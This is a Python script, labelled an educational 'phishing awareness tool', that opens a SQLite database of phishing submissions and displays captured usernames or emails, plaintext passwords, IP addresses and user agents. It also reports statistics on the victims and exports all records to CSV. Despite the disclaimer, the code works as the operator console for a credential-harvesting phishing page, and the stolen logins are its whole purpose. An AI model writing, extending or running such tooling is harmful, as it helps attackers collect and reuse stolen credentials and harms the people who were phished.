#!/usr/bin/env python3
"""
SQLite Data Extractor for Phishing Awareness Tool
Educational purposes only
"""

import sqlite3
import os
import sys
from datetime import datetime

def print_header():
    """Print script header"""
    print("=" * 80)
    print("PHISHING AWARENESS TOOL - DATA EXTRACTOR")
    print("Educational Purposes Only")
    print("=" * 80)
    print()

def get_database_path():
    """Get the database file path"""
    # Try to find the database in current directory
    db_path = 'phishing_data.db'
    
    if not os.path.exists(db_path):
        print(f"Database file '{db_path}' not found in current directory.")
        print("Please specify the path to your database file:")
        db_path = input("Database path: ").strip()
        
        if not os.path.exists(db_path):
            print(f"Error: Database file '{db_path}' does not exist!")
            sys.exit(1)
    
    return db_path

def connect_database(db_path):
    """Connect to SQLite database"""
    try:
        conn = sqlite3.connect(db_path)
        return conn
    except sqlite3.Error as e:
        print(f"Error connecting to database: {e}")
        sys.exit(1)

def get_table_info(conn):
    """Get information about tables in the database"""
    cursor = conn.cursor()
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    tables = cursor.fetchall()
    return [table[0] for table in tables]

def show_table_data(conn, table_name):
    """Display all data from a specific table"""
    cursor = conn.cursor()
    
    try:
        # Get column names
        cursor.execute(f"PRAGMA table_info({table_name})")
        columns = [column[1] for column in cursor.fetchall()]
        
        # Get all data
        cursor.execute(f"SELECT * FROM {table_name}")
        rows = cursor.fetchall()
        
        return columns, rows
        
    except sqlite3.Error as e:
        print(f"Error reading table {table_name}: {e}")
        return None, None

def display_submissions(columns, rows):
    """Display submissions in a formatted table"""
    if not rows:
        print("No data found in submissions table.")
        return
    
    print(f"\nSUBMISSIONS DATA - Total Records: {len(rows)}")
    print("-" * 120)
    
    # Print column headers
    header_format = "{:<3} {:<25} {:<20} {:<15} {:<30} {:<20}"
    print(header_format.format("ID", "Username/Email", "Password", "IP Address", "User Agent", "Timestamp"))
    print("-" * 120)
    
    # Print each row
    for row in rows:
        # Truncate long values for better display
        username = str(row[1])[:23] + "..." if len(str(row[1])) > 25 else str(row[1])
        password = str(row[2])[:17] + "..." if len(str(row[2])) > 20 else str(row[2])
        ip_address = str(row[3])
        user_agent = str(row[4])[:27] + "..." if len(str(row[4])) > 30 else str(row[4])
        timestamp = str(row[5])[:19] if row[5] else "N/A"
        
        print(header_format.format(
            row[0], username, password, ip_address, user_agent, timestamp
        ))
    
    print("-" * 120)

def export_to_csv(conn, filename=None):
    """Export data to CSV file"""
    if not filename:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"phishing_data_export_{timestamp}.csv"
    
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM submissions")
    rows = cursor.fetchall()
    
    # Get column names
    cursor.execute("PRAGMA table_info(submissions)")
    columns = [column[1] for column in cursor.fetchall()]
    
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            # Write header
            f.write(','.join(columns) + '\n')
            
            # Write data
            for row in rows:
                # Escape commas and quotes in data
                escaped_row = []
                for item in row:
                    if item is None:
                        escaped_row.append('')
                    else:
                        item_str = str(item).replace('"', '""')
                        if ',' in item_str or '"' in item_str:
                            escaped_row.append(f'"{item_str}"')
                        else:
                            escaped_row.append(item_str)
                
                f.write(','.join(escaped_row) + '\n')
        
        print(f"\nData exported successfully to: {filename}")
        print(f"Total records exported: {len(rows)}")
        
    except Exception as e:
        print(f"Error exporting to CSV: {e}")

def show_statistics(conn):
    """Show statistics about the data"""
    cursor = conn.cursor()
    
    print("\nSTATISTICS")
    print("-" * 40)
    
    # Total submissions
    cursor.execute("SELECT COUNT(*) FROM submissions")
    total = cursor.fetchone()[0]
    print(f"Total Submissions: {total}")
    
    # Submissions by date
    cursor.execute("""
        SELECT DATE(timestamp), COUNT(*) 
        FROM submissions 
        GROUP BY DATE(timestamp) 
        ORDER BY DATE(timestamp) DESC
        LIMIT 10
    """)
    print("\nRecent Submissions by Date:")
    for date, count in cursor.fetchall():
        print(f"  {date}: {count} submissions")
    
    # Unique IP addresses
    cursor.execute("SELECT COUNT(DISTINCT ip_address) FROM submissions")
    unique_ips = cursor.fetchone()[0]
    print(f"\nUnique IP Addresses: {unique_ips}")
    
    # Most common user agents
    cursor.execute("""
        SELECT user_agent, COUNT(*) 
        FROM submissions 
        GROUP BY user_agent 
        ORDER BY COUNT(*) DESC 
        LIMIT 5
    """)
    print("\nTop 5 User Agents:")
    for user_agent, count in cursor.fetchall():
        agent_short = user_agent[:50] + "..." if len(user_agent) > 50 else user_agent
        print(f"  {count} submissions: {agent_short}")

def main():
    """Main function"""
    print_header()
    
    # Get database path
    db_path = get_database_path()
    
    # Connect to database
    conn = connect_database(db_path)
    
    try:
        # Get available tables
        tables = get_table_info(conn)
        
        if not tables:
            print("No tables found in the database!")
            return
        
        print(f"Available tables: {', '.join(tables)}")
        
        # Main menu loop
        while True:
            print("\nOPTIONS:")
            print("1. View all submissions")
            print("2. Show statistics")
            print("3. Export to CSV")
            print("4. Raw SQL query")
            print("5. Exit")
            
            choice = input("\nEnter your choice (1-5): ").strip()
            
            if choice == '1':
                # View submissions table
                columns, rows = show_table_data(conn, 'submissions')
                if columns and rows:
                    display_submissions(columns, rows)
            
            elif choice == '2':
                # Show statistics
                show_statistics(conn)
            
            elif choice == '3':
                # Export to CSV
                filename = input("Enter CSV filename (or press Enter for auto-generated): ").strip()
                if not filename:
                    filename = None
                export_to_csv(conn, filename)
            
            elif choice == '4':
                # Raw SQL query
                query = input("Enter SQL query: ").strip()
                if query:
                    try:
                        cursor = conn.cursor()
                        cursor.execute(query)
                        
                        if query.strip().upper().startswith('SELECT'):
                            rows = cursor.fetchall()
                            if rows:
                                # Get column names
                                columns = [description[0] for description in cursor.description]
                                print("\nQuery Results:")
                                print("-" * 80)
                                for row in rows:
                                    print(row)
                            else:
                                print("No results found.")
                        else:
                            conn.commit()
                            print("Query executed successfully.")
                    
                    except sqlite3.Error as e:
                        print(f"SQL Error: {e}")
            
            elif choice == '5':
                print("Goodbye!")
                break
            
            else:
                print("Invalid choice! Please enter 1-5.")
    
    except KeyboardInterrupt:
        print("\n\nOperation cancelled by user.")
    
    finally:
        conn.close()

if __name__ == "__main__":
    main()